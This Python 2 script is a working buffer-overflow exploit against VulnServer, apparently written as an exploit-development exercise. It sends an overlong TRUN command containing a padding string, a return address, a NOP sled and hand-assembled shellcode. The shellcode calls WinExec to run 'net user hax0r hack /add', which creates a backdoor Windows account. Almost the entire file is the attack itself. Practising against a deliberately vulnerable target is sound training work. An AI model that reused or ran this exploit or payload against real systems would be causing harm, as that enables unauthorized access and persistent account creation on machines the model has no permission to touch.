import socket
import sys

try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
except:
	print "  USAGE: python custom-payload-calc.py <IP> <PORT>"
	print "EXAMPLE: python custom-payload-calc.py 192.168.1.1 9999"
	exit()


garbage = "A" * 2006
ret = "\xAF\x11\x50\x62" 	
nop = "\x90" * 24

#This calls the WinExec function and passes "net user hax0r hack /add" into it.
#This will create a user account named "hax0r" with the password "hack"
#Note: For this to work, you must run VulnServer as an administrator.

buf ="\x33\xc0" 		# XOR EAX EAX
buf +="\x50"			# PUSH EAX
buf +="\x68\x2f\x61\x64\x64"	# PUSH "/add"
buf +="\x68\x61\x63\x6b\x20"	# PUSH "ack "
buf +="\x68\x30\x72\x20\x68"	# PUSH "0r h"
buf +="\x68\x20\x68\x61\x78"	# PUSH " hax"
buf +="\x68\x75\x73\x65\x72"	# PUSH "user"
buf +="\x68\x6e\x65\x74\x20"	# PUSH "net"
buf +="\x8b\xc4"		# MOV EAX,ESP
buf +="\x6a\x01"		# PUSH 1
buf +="\x50"			# PUSH EAX 
buf +="\xBB\xFD\xe5\x90\x75"	# Move address of WinExec to EBX
buf +="\xFF\xD3"		# CALL EBX

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
badstr = "TRUN ." + garbage + ret + nop + buf + "\r\n"

s.send(badstr)
s.close()
